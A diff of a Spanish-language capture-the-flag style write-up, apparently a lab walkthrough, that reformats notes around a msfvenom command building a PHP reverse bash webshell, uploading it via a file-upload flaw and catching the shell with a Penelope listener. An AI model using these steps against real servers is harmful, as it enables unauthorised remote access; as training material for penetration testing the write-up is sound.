@@ -59,9 +59,9 @@ Ahora, teniendo en cuenta esto, pasamos a crearla con `msfvemom`:
 
 `msfvenom -p php/unix/cmd/reverse_bash LHOST=<IP_local> LPORT=<puerto_local> R -o webshell.php.phar`  
 
-> La `R` es equivalente a `-f raw` que significa *Código en Crudo*  
-> Usamos el payload anterior para poder recibir la conexión reversa con alguna otra herramienta alternativa a Meterpreter, para variar.
-> Aquí suponemos que el usuario www-data usa el intérprete de bash (y lo hace), pero de no funcionar, buscaríamos otro.  
+> * La `R` es equivalente a `-f raw` que significa *Código en Crudo*
+> * Usamos el payload anterior para poder recibir la conexión reversa con alguna otra herramienta alternativa a Meterpreter, para variar.
+> * Suponemos que el usuario www-data usa el intérprete de bash (y lo hace), pero de no funcionar, buscaríamos otro.  
 
 Bien, una vez creada, procedemos a subirla. Tenemos éxito y nos dirigimos a `/uploads` donde verificamos la misma. Ahora, pasamos a preparar nuestro listener. En este caso, usamos [Penélope](https://github.com/brightio/penelope). Con `penelope -i <IP_local> -p <puerto>` creamos nuestro listener. Corremos y ejecutamos la webshell en el navegador. Tenemos acceso.  
 
